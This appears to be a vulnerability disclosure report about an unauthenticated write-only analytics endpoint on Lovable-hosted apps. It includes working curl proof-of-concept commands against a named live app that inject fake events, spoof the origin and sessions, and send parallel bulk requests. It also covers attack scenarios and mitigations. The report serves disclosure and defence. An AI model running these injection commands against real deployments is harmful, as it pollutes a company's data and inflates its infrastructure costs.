# Unauthenticated Analytics Proxy (Write-Only)

**Date**: November 26, 2025
**Severity**: High
**Type**: Missing Authentication / Data Injection

---

## Summary

The `/~api/analytics` proxy endpoint on deployed Lovable applications accepts unauthenticated POST requests from any origin. This allows external parties to inject arbitrary data into Lovable's analytics pipeline.

**Note**: This is a write-only vulnerability. The endpoint does not expose read access to analytics data.

| Operation | Access |
|-----------|--------|
| **WRITE** (POST) | Unauthenticated - anyone can inject |
| **READ** (GET) | Not exposed - returns app HTML |

---

## Vulnerability Details

### Affected Endpoint

```
POST https://[any-app].lovable.app/~api/analytics
```

### Expected Behavior

Analytics endpoints typically require one or more of:
- Authentication token
- Origin validation
- Session verification
- CAPTCHA or rate limiting

### Actual Behavior

The endpoint accepts:
- Requests with no authentication
- Requests from any origin
- Arbitrary action names and payload data
- Spoofed session IDs
- Multiple parallel requests (no rate limiting observed)

---

## Proof of Concept

### Test 1: Unauthenticated Request

```bash
curl -X POST "https://estates-pro.lovable.app/~api/analytics" \
  -H "Content-Type: application/json" \
  -d '{"timestamp":"2025-11-26T00:00:00.000Z","action":"test","version":"1","session_id":"external-test","payload":"{}"}'
```

**Response**: `HTTP 200` - `Done`

### Test 2: Cross-Origin Request

```bash
curl -X POST "https://estates-pro.lovable.app/~api/analytics" \
  -H "Content-Type: application/json" \
  -H "Origin: https://evil-attacker.com" \
  -H "Referer: https://evil-attacker.com/attack" \
  -d '{"timestamp":"2025-11-26T00:00:00.000Z","action":"cross_origin","version":"1","session_id":"attacker","payload":"{}"}'
```

**Response**: `HTTP 200` - `Done`

### Test 3: Arbitrary Event Injection

```bash
curl -X POST "https://estates-pro.lovable.app/~api/analytics" \
  -H "Content-Type: application/json" \
  -d '{"timestamp":"2025-11-26T00:00:00.000Z","action":"INJECTED_MALICIOUS_EVENT","version":"1","session_id":"attacker","payload":"{\"attack\":true}"}'
```

**Response**: `HTTP 200` - `Done`

### Test 4: User Data Spoofing

```bash
curl -X POST "https://estates-pro.lovable.app/~api/analytics" \
  -H "Content-Type: application/json" \
  -d '{"timestamp":"2025-11-26T00:00:00.000Z","action":"page_hit","version":"1","session_id":"spoofed-uuid","payload":"{\"user-agent\":\"Spoofed\",\"locale\":\"fake\",\"location\":\"XX\",\"pathname\":\"/admin\"}"}'
```

**Response**: `HTTP 200` - `Done`

### Test 5: Bulk Injection (No Rate Limiting)

```bash
for i in {1..5}; do
  curl -s -X POST "https://estates-pro.lovable.app/~api/analytics" \
    -H "Content-Type: application/json" \
    -d "{\"action\":\"bulk_${i}\",\"session_id\":\"bulk\",\"payload\":\"{}\"}" &
done
wait
```

**Response**: All 5 requests return `Done`

---

## Test Results Summary

### Write Tests (POST)

| Test Case | Authentication | Origin Check | Result |
|-----------|---------------|--------------|--------|
| No cookies/tokens | None required | Not checked | ✅ Accepted |
| External origin header | None required | Not checked | ✅ Accepted |
| Arbitrary action name | None required | Not checked | ✅ Accepted |
| Spoofed user data | None required | Not checked | ✅ Accepted |
| Parallel requests | None required | Not checked | ✅ All accepted |
| Large payload (8KB+) | N/A | N/A | ❌ Rejected |

### Read Tests (GET)

| Test Case | Result |
|-----------|--------|
| GET /~api/analytics | Returns app HTML (SPA fallback) |
| GET with query params | Returns app HTML |
| POST with SQL query in body | Ignored - just writes the data |

**Conclusion**: Read access is not exposed. The vulnerability is write-only.

---

## Severity Justification (HIGH)

While this is a write-only vulnerability (no data breach), the severity is HIGH due to:

| Factor | Impact |
|--------|--------|
| **Systemic scope** | Affects every deployed Lovable application |
| **No rate limiting** | Enables large-scale automated attacks |
| **Financial impact** | Tinybird costs scale with ingested data volume |
| **Business decision risk** | Polluted analytics lead to bad product/investment decisions |
| **Low attacker effort** | Single curl command, no authentication needed |

### Financial Damage Vectors

1. **Infrastructure costs**: Tinybird charges based on data ingestion. Unlimited injection = unbounded costs.

2. **Business intelligence corruption**: If Lovable uses this data for:
   - Product roadmap decisions
   - Investor reporting
   - Growth metrics
   - Customer analytics dashboards

   Polluted data leads to misinformed decisions with real financial consequences.

3. **Competitive attack**: A competitor could systematically inject false data to:
   - Mask real usage patterns
   - Create artificial signals
   - Undermine Lovable's understanding of their own platform

---

## Attack Scenarios

### 1. Analytics Pollution

An attacker can inject large volumes of fake analytics data:
- False page view counts
- Fake user sessions
- Fabricated geographic data
- Artificial traffic patterns

**Impact**: Corrupts Lovable's analytics data, potentially affecting business decisions.

### 2. Session Spoofing

An attacker can inject events with arbitrary session IDs:
- Create fake user journeys
- Attribute actions to non-existent sessions
- Potentially interfere with real user session data

### 3. Resource Consumption

Without rate limiting, an attacker could:
- Generate high volumes of requests
- Consume Tinybird API quotas
- Increase Lovable's infrastructure costs

### 4. Competitor Intelligence Poisoning

A competitor could inject misleading data to:
- Skew Lovable's internal metrics
- Create false signals about feature usage
- Mask real user behavior patterns

---

## Root Cause Analysis

The proxy endpoint:

1. **Lacks authentication** - No API key, JWT, or session token required
2. **No origin validation** - CORS headers are permissive or not enforced for POST
3. **No rate limiting** - Multiple parallel requests accepted
4. **Trusts client data** - Accepts arbitrary values for all fields

The design appears to prioritize simplicity (allowing flock.js to work without client-side auth) over security.

---

## Data Flow

```
Attacker                    Lovable App              Tinybird
   │                            │                       │
   │ POST /~api/analytics       │                       │
   │ (no auth, any origin)      │                       │
   │ ─────────────────────────► │                       │
   │                            │ Forward + add token   │
   │                            │ ─────────────────────►│
   │                            │                       │ Store in
   │                            │                       │ analytics_events
   │                            │     200 "Done"        │
   │                            │ ◄─────────────────────│
   │        200 "Done"          │                       │
   │ ◄───────────────────────── │                       │
   │                            │                       │
   │  Fake data now in          │                       │
   │  Lovable's analytics       │                       │
```

---

## Mitigations (Recommendations)

1. **Add request signing** - Require flock.js to sign requests with a time-limited token
2. **Origin validation** - Restrict to same-origin requests only
3. **Rate limiting** - Implement per-IP or per-session request limits
4. **Session binding** - Verify session_id exists and was issued by the server
5. **Anomaly detection** - Flag unusual patterns (high volume, suspicious payloads)

---

## Comparison: Expected vs. Actual

| Security Control | Expected | Actual |
|-----------------|----------|--------|
| Authentication | API key or signed request | None |
| Origin check | Same-origin only | Any origin |
| Rate limiting | Per-IP/session limits | None observed |
| Input validation | Strict schema | Accepts arbitrary JSON |
| Session verification | Server-issued only | Accepts any string |

---

## Verification Commands

```bash
# Verify the vulnerability still exists
curl -s -X POST "https://[app].lovable.app/~api/analytics" \
  -H "Content-Type: application/json" \
  -d '{"action":"test","session_id":"verify","payload":"{}"}' \
  && echo " - Vulnerable if returns 'Done'"
```

---

## References

- Proxy analysis: `final-report/proxy-analysis.md`
- flock.js analysis: `final-report/flock-js-analysis.md`
- Full flow diagram: `final-report/full-flow.mmd`
